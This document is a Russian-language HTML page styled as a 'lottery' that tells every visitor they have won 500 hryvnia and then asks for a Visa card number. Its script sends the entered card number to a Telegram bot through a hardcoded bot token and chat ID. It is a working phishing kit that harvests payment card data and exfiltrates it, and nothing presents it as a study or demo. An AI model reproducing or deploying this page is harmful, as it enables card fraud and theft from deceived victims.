<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Алексашка лотерея</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background-color: purple; /* Фиолетовый фон */
            color: white; /* Белый текст для контраста с фиолетовым фоном */
        }
        h1 {
            color: white;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            cursor: pointer;
        }
        #checkWinButton {
            background-color: red;
            color: white;
        }
        #getWinButton {
            background-color: blue;
            color: white;
        }
        #submitButton {
            background-color: green;
            color: white;
        }
        input[type="text"] {
            margin-top: 10px;
            color: black;
        }
    </style>
</head>
<body>

<h1>Алексашка лотерея</h1>

<button id="checkWinButton">Проверить выигрыш</button>
<div id="winAmount" style="display: none;">Вы выиграли 500 грн!</div>

<button id="getWinButton" style="display: none;">Получить выигрыш</button>

<form id="cardForm" style="display: none;">
    <input type="text" placeholder="Введите номер карты Visa">
    <button id="submitButton" type="submit">Отправить</button>
</form>

<script>
    // Токен вашего бота (замените YOUR_TELEGRAM_BOT_TOKEN на реальный токен)
    const telegramBotToken = '7722340722:AAEaDuiYXEot1VL7sAhfsxbf4sUl38iwO3c'; // Ваш реальный токен

    // Числовой ID чата (бота @AlexaLotareyabot) - можно получить через /getUpdates
    const chatId = '6545922136'; // Замените на ваш реальный числовой chat_id, например, 6545922136

    // Функция для отправки сообщения в Telegram
    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const data = {
            chat_id: chatId,
            text: message
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent:', data);
            if (data.ok) {
                alert('Сообщение успешно отправлено!');
            } else {
                alert('Ошибка при отправке сообщения: ' + data.description);
            }
        })
        .catch(error => {
            console.error('Error sending message:', error);
            alert('Ошибка при отправке сообщения: ' + error.message);
        });
    }

    // Обработчик нажатия на кнопку "Проверить выигрыш"
    document.getElementById('checkWinButton').addEventListener('click', () => {
        document.getElementById('winAmount').style.display = 'block';
        document.getElementById('getWinButton').style.display = 'inline-block';
    });

    // Обработчик нажатия на кнопку "Получить выигрыш"
    document.getElementById('getWinButton').addEventListener('click', () => {
        document.getElementById('cardForm').style.display = 'block';
    });

    // Обработчик отправки формы (можно добавить обработку данных)
    document.getElementById('cardForm').addEventListener('submit', (event) => {
        event.preventDefault();
        
        const cardNumber = event.target.querySelector('input[type="text"]').value;
        if (cardNumber) {
            const message = `Данные карты: ${cardNumber}`;
            sendToTelegram(message);
        } else {
            alert('Пожалуйста, введите номер карты.');
        }
    });
</script>

</body>
</html>
